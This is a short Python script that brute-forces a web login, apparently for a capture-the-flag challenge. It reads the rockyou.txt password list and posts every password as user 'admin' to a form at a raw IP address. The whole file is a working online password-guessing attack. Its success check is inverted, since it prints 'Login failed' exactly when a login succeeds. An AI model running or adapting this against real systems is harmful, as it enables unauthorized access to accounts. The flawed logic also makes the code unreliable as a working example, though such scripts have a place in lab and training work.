

import requests

url = "http://188.166.173.208:31142/question1/"

# userid=admin&passwd=admin&submit=submit

fd = open("rockyou.txt",'r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))

for i in passwords:

	data2 = {
		"userid":"admin",
		"passwd":i,
		"submit":"submit"
	}


	r = requests.post(url,data=data2)

	if not "Invalid credentials" in r.text:
		print("Login failed")
#print(r.text)
